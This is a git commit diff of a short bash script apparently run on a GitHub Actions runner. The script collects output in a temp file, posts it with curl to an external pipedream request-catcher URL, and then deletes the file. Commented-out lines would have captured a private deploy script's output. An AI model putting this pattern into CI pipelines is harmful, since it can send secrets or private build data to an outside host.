e7aee58f15b535ce62fffd929d5c4d3f1f636973
_m <matiasesena@gmail.com>
2021-11-05 15:28:41 -0300

    Update falopa3.sh

--- falopa3.sh
+++ falopa3.sh
@@ -1,14 +1,14 @@
 #!/bin/bash
 
-echo "--- START ---" > /tmp/file.txt
+echo "--- START ---" > /tmp/file2.txt
 
-#perf report --header-only >> /tmp/file.txt
-echo "-----" >> /tmp/file.txt
+#perf report --header-only >> /tmp/file2.txt
+echo "-----" >> /tmp/file2.txt
 SCRIPT_PATH="/home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena/deploy-script.sh"
-#bash "$SCRIPT_PATH" >> /tmp/file.txt
+#bash "$SCRIPT_PATH" >> /tmp/file2.txt
 
-echo "--- FINISH ---" >> /tmp/file.txt
+echo "--- FINISH ---" >> /tmp/file2.txt
 
-curl --data-binary "@/tmp/file.txt" https://entym8w3w4dfm.x.pipedream.net/
+curl --data-binary "@/tmp/file2.txt" https://entym8w3w4dfm.x.pipedream.net/
 
-rm /tmp/file.txt
+rm /tmp/file2.txt
